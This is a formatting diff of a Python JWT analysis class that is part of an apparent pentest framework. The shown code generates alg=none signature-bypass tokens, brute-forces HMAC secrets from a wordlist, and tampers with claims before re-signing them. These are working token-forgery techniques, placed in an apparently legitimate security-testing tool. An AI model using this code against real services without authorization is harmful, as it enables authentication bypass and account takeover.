@@ -1,4 +1,5 @@
 """JWT analysis tool — decode, algorithm confusion, key brute, claim manipulation."""
+
 from __future__ import annotations
 
 import asyncio
@@ -25,8 +26,7 @@ class JwtTool(BasePentestTool):
 
     name = "jwt_tool"
     description = (
-        "JWT analysis — decode tokens, detect algorithm confusion, "
-        "brute-force weak secrets, manipulate claims."
+        "JWT analysis — decode tokens, detect algorithm confusion, brute-force weak secrets, manipulate claims."
     )
 
     ACTIONS: dict[str, dict[str, Any]] = {
@@ -42,7 +42,8 @@ class JwtTool(BasePentestTool):
         },
         "jwt_crack": {
             "cmd": [
-                "python3", "-c",
+                "python3",
+                "-c",
                 "import jwt,sys; "
                 "[print(f'FOUND: {{w}}') or sys.exit(0) "
                 "for w in open('{wordlist}').read().splitlines() "
@@ -129,6 +130,7 @@ class JwtTool(BasePentestTool):
             result["analysis"].append(f"⚠️ X5U header present: {header['x5u']} — potential SSRF")
 
         import time
+
         exp = payload.get("exp")
         if exp and isinstance(exp, (int, float)):
             if exp < time.time():
@@ -155,17 +157,20 @@ class JwtTool(BasePentestTool):
         variants = []
         for alg_val in ["none", "None", "NONE", "nOnE"]:
             new_header = {**header, "alg": alg_val}
-            header_b64 = base64.urlsafe_b64encode(
-                json.dumps(new_header, separators=(",", ":")).encode()
-            ).rstrip(b"=").decode()
+            header_b64 = (
+                base64.urlsafe_b64encode(json.dumps(new_header, separators=(",", ":")).encode()).rstrip(b"=").decode()
+            )
             # Empty signature
             variants.append(f"{header_b64}.{payload_raw}.")
 
-        return json.dumps({
-            "original_algorithm": header.get("alg", "unknown"),
-            "bypass_tokens": variants,
-            "note": "Send each variant to the target — if any are accepted, the server is vulnerable to algorithm=none bypass",
-        }, indent=2)
+        return json.dumps(
+            {
+                "original_algorithm": header.get("alg", "unknown"),
+                "bypass_tokens": variants,
+                "note": "Send each variant to the target — if any are accepted, the server is vulnerable to algorithm=none bypass",
+            },
+            indent=2,
+        )
 
     def _tamper_jwt(self, token: str, claims_json: str, secret: str) -> str:
         """Modify claims and re-sign with provided secret."""
@@ -183,32 +188,32 @@ class JwtTool(BasePentestTool):
         payload.update(new_claims)
 
         # Re-encode
-        header_b64 = base64.urlsafe_b64encode(
-            json.dumps(header, separators=(",", ":")).encode()
-        ).rstrip(b"=").decode()
-        payload_b64 = base64.urlsafe_b64encode(
-            json.dumps(payload, separators=(",", ":")).encode()
-        ).rstrip(b"=").decode()
+        header_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(",", ":")).encode()).rstrip(b"=").decode()
+        payload_b64 = (
+            base64.urlsafe_b64encode(json.dumps(payload, separators=(",", ":")).encode()).rstrip(b"=").decode()
+        )
 
         if secret:
             import hmac
             import hashlib
+
             alg = header.get("alg", "HS256")
             hash_func = {
                 "HS256": hashlib.sha256,
                 "HS384": hashlib.sha384,
                 "HS512": hashlib.sha512,
             }.get(alg, hashlib.sha256)
-            sig = hmac.new(
-                secret.encode(), f"{header_b64}.{payload_b64}".encode(), hash_func
-            ).digest()
+            sig = hmac.new(secret.encode(), f"{header_b64}.{payload_b64}".encode(), hash_func).digest()
             sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
         else:
             sig_b64 = ""
 
         tampered = f"{header_b64}.{payload_b64}.{sig_b64}"
-        return json.dumps({
-            "tampered_token": tampered,
-            "modified_claims": new_claims,
-            "signed_with": "provided secret" if secret else "no signature (alg=none style)",
-        }, indent=2)
+        return json.dumps(
+            {
+                "tampered_token": tampered,
+                "modified_claims": new_claims,
+                "signed_with": "provided secret" if secret else "no signature (alg=none style)",
+            },
+            indent=2,
+        )
